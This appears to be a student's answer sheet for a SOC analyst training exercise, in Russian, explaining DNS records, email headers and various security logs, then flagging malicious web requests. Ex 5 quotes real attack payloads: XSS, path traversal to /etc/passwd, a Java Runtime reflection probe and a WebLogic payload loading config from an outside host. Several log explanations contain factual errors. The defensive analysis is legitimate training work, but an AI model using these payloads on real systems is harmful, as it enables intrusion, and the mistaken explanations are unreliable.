# kaspi-SOC2.0-answers
Ex.1

Строка 1:
	ХОСТ: "kaspi.kz" - это доменное имя;
	КЛАСС: "IN" - означает что это запись интернета;
	ТИП: "A" - означает что эта запись содержит IP-адрес;
СОДЕРЖАНИЕ ЗАПИСИ: "ip = 194.187.245.10" - IP-адрес сервера kaspi.kz;

Строка 2:
ТИП: "NS" -означает что запись связана с именами DNS-серверов;
	target = ns.bc.kz - имя DNS-сервера, связанного с доменом;

Строка 3, 4, 5:
	target = ns2.kaspi.kz - имя DNS-сервера, связанного с доменом;

Строка 6:
	ТИП: "SOA" - запись хранит данные о главном DNS-сервере для домена и его параметры, например
	mname = ns.bc.kz - имя главного DNS-сервера для домена;
	rname = telecomdev.kaspi.kz - eМail владельца зоны;
	serial = 2018122633 - номер версии зоны;
	refresh = 600 - проверяет наличие обновлений в зоне каждые 60 секунд;
	retry = 150 - повторяет попытку обновления при ошибке каждые 150 секунд;
	expire = 28800 - зона устаревшая, если главный DNS-сервер получил обновление после 28800 секунд;
	minimum-ttl = 300 - при не заданном TTL минимальное время жизни записей зоны 300 секунд;

Строка 7, 8:
	ТИП: "MX" - запись хранит данные о почтовом сервере
	pri = 10 - приоритетность этой MX-записи в списке других MX-записей. Чем ниже число, тем выше приоритет данного сервера.
	target = bmss-01d.kaspi.kz - имя почтового сервера

Строка 9, 10, 11, 12, 13:
	ТИП: "TXT" - запись содержит текст.
	txt = google-site-verification=x-9S3SCWGLPV4449a3riJHAdsBWLD44A8YGrmESd0gA - содержание записи

Строка 14:
	ТИП: "PTR" - запись для обратного связывания IP-адреса с доменным именем.
	10.245.187.194.in-addr.arpa - это имя хоста, обозначает обратное доменное имя - IP-адресу 194.187.245.10.
	kaspi.kz - доменное имя, связанное с указанным IP-адресом.




Ex 2:
	Этот email header содержит записи о получении. Запись хранит данные об отправителе, получателе и использованном протоколе.

	Первый блок указывает, что письмо было отправлено с хоста exch3.localhost (IP-адрес 10.1.1.1) с помощью Microsoft SMTP Server, используя TLS 1.2 с шифрованием TLS_RSA_WITH_AES_256_GCM_SHA384.

	Второй блок указывает, что письмо было отправлено с того же хоста exch3.localhost (IP-адрес 10.1.1.1), но было получено на другом хосте, exch2.localhost (IP-адрес 10.1.1.2), используя тот же самый протокол SMTP Server с тем же шифрованием TLS_RSA_WITH_AES_256_GCM_SHA384.

	Третий блок указывает, что письмо было отправлено с хоста nodename.kaspi.kz (IP-адрес 10.1.1.2), получено на хосте exch2.localhost (IP-адрес 10.1.1.2), с использованием протокола SMTP Server и шифрования TLS_RSA_WITH_AES_256_CBC_SHA256.

	Запись Authentication-Results указывает, что отправитель, elndjeni@visa.com, прошел проверку SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail) и DMARC (Domain-based Message Authentication, Reporting and Conformance).
Запись ISDR содержит зашифрованные данные, которые могут использоваться для проверки целостности и подлинности письма.

	Запись IPHdr содержит некоторые дополнительные данные в виде строки, которая была разделена на несколько частей из-за ограничений длины строки. Это могут быть дополнительные заголовки, такие как заголовок передачи или заголовок протокола.

Ex 3:
	Система обнаружила потенциальную угрозу в виде вредоносного ПО - Win.Trojan.Banker.
	Система отследила и зарегистрировала исходящее подключение с IP-адресом и портом, используемым для передачи вредоносного кода.

	Безопасность предприятия должны обнаружить и удалить вредоносного ПО, провести анализ вредоносной активности, а также принимать меры для улучшения защиты сети и предотвращения подобных атак в будущем.


Ex 4:
	Лог-запись NGINX содержит
	Имя пользователя: отсутствует.
	IP адрес источника: 10.1.2.3
	IP адрес назначения: 109.166.59.44
	Порт источника: отсутствует.
	Порт назначения: отсутствует.
	Событие: "GET /shop-ext/suggestions/?i=productDetails&m=true&t=IP&pi=14701657&u=3729495
HTTP/1.1"
	Статус: 200
	Реферер: "https://kaspi.kz/shop/p/gerbor-vusher-reg1w2d2s-13-9-l-p-nimfea-al-ba-belyi-gljanets-14701657/?c=551010000"
	Браузер: "Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv)
	AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"
	Время запроса: 0.009
	Время ответа: 0.008
	Порт назначения с указанием протокола: 10.2.3.4:9001

Строка журнала почтового сервера.
	<22> - приоритет журнала событий
	Dec 04 12:22:00 - дата и время события.
	Mail_Logs - имя журнала.
	Info - уровень журнала.
	New SMTP ICID 11444342 - идентификатор SMTP соединения
	interface MAIL (172.1.2.3) - интерфейс, через который было создано соединение SMTP.
	address 62.141.46.147 - IP-адрес удаленного SMTP-сервера.
	reverse dns host s2.kipersam.art - обратное DNS-имя удаленного SMTP-сервера.
	verified yes - флаг, показывающий, была ли проверка обратного DNS-имени успешной (в данном случае - да).


#3 Proxy Server
	<30> - приоритет журнала событий
	Dec 4 12:21:59 - дата и время события.
	mwg-prx1 - имя сервера.
	mwg - имя приложения, которое создало лог.
	LEEF:1.0|PRXName|Web Gateway|7.8.2.11.0|0|devTime=1575440519000 - это формат лога, который используется для отправки логов в системы управления событиями. В этом случае, это формат LEEF версии 1.0, который содержит информацию о имени прокси-сервера, версии ПО и времени устройства.
	src=10.7.8.9 - это исходный IP-адрес клиента.
	usrName=petrov_123 - имя пользователя, которое было использовано для аутентификации.
	userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36 - это информация о браузере, который был использован клиентом.
	httpStatus=200 - это код состояния HTTP-запроса, который был получен от сервера.
	dst=149.154.167.99 - это IP-адрес сервера, к которому происходило обращение.
	urlCategories=Instant Messaging - это категория URL-адреса, которая была обнаружена на сайте.
	blockReason= - это причина блокировки, если URL-адрес был заблокирован.
	url=https://venus.web.telegram.org/apiw1 - это URL-адрес, который был запрошен клиентом. В этом случае, это API-запрос к Telegram.

#3 ASA

Этот лог был сгенерирован устройством ASA (Adaptive Security Appliance), который является устройством сетевой безопасности, разработанным компанией Cisco. В этом логе указаны следующие данные:
	<166> - номер уровня срочности (severity level), который указывает на критичность события (166 соответствует уровню "critical").
	Dec 04 2019 12:21:59 - дата и время, когда произошло событие.
	ASA1234 - идентификатор устройства.
	Deny TCP (no connection) - действие, которое было выполнено ASA в результате события. В данном случае, ASA отклонил TCP-пакет, так как связь не была установлена.
	from 90.143.47.21/42968 - источник пакета, указывающий на IP-адрес и номер порта отправителя.
	to 194.187.247.147/443 - назначение пакета, указывающий на IP-адрес и номер порта получателя.
	flags ACK - флаги, указывающие на тип пакета. ACK - это подтверждение получения предыдущего пакета.
	Таким образом, этот лог сообщает о том, что ASA отклонил TCP-пакет, поскольку не было установлено соединение между отправителем и получателем.


#4 Mail Log

Эти логи связаны с почтовым сервером и содержат информацию об ICID (идентификаторе контекста сообщения), а также о соответствующих проверках безопасности и списках.
Первый лог сообщает, что сообщение с ICID 11444342 было принято и соответствовало списку SUSPECTLIST с совпадением SBRS (-3.0:-1.0) и страной отправления Германия.
Второй лог сообщает, что сообщение с ICID 11444341 было отклонено из-за соответствия списку BLACKLIST с совпадением SBRS (-10.0:-3.0) и страной отправления Монголия.


#5 FW
Это лог события устройства защиты (FW), который указывает, что обнаружена вредоносная активность в файле с именем "online_126657052_3.pdf". Событие было зарегистрировано на устройстве с IP-адресом 10.10.10.1 в 12:21:55 4 декабря 2019 года.
Данные о файле включают его размер (46197 байт), тип (PDF), имя и хэш-сумму (CD22437892392E03BF5375B597AA77DE6F0E5D9F26B1832339B79DA19F050BF7).
Событие также содержит информацию о соединении, в котором был обнаружен вредоносный файл, включая адрес и порт источника и назначения, а также протокол и имя службы (SMTP).
Другая информация включает политику контроля доступа, ID пользователя, имя пользователя и сведения о протоколе. Событие также указывает, что файл был помечен как вредоносный с дальнейшим отклонением (disposition=2), а также о том, что его анализ был произведен локально (localMalwareAnalysisStatus=5)


Ex 5:
Нелегитимные запросы в данном логе:
2023-02-15T08:32:00	data.kaspi.lab 443 85.117.101.213 10.2.1.12	80	GET	/market/api/v2/orders	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36	%3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E	kaspi.lab
Запрос содержит параметр запроса "%3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E", который является скриптом JavaScript, с помощью него можно внедрить js-код в НTML 
ip с которого отправили запрос - 85.117.101.213

2023-02-15T08:32:00	chat.kaspi.lab 443 188.246.252.144 10.17.8.228	80	POST/market/p/linea-8035154p-55-zoloto-100959802/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36	lang=ru-RU&code=&query=%D0	kaspi.lab
Не уверен на признак уязвимости, однако запрос хранит http протокол и подозрительные параметры code=&query=% могут содержать данные

2023-02-15T08:32:00	new.kaspi.lab 443 81.91.187.59	10.2.50.20	80	POST	/bottles/dashboars/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+9;+TECNO+CC7+Build/PPR1.180610.011;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/101.0.4951.41+Mobile+Safari/537.366	actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D	kaspi.lab
Не уверен на признак уязвимости, однако запрос хранит “actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D” в котором может хранится вредоносный код

2023-02-15T08:32:00	dev.kaspi.lab 443 78.109.191.117 10.2.50.21	80	POST /page/api/login/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+12;+SM-A315F+Build/SP1A.210812.016;+wv)	view%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd	kaspi.lab
параметре "view" указана строка, которая содержит путь до файла "/etc/passwd",

2023-02-15T08:32:00	forum.kaspi.lab 443	79.133.190.153 10.2.1.12	80	POST	/bottles/dashboardapi2/api/v1/Dashboard/getSampleRequest	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(iPhone;+CPU+iPhone+OS+13,4+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148	_nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29	kaspi.lab
'_nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29’  - возможна уязвимость
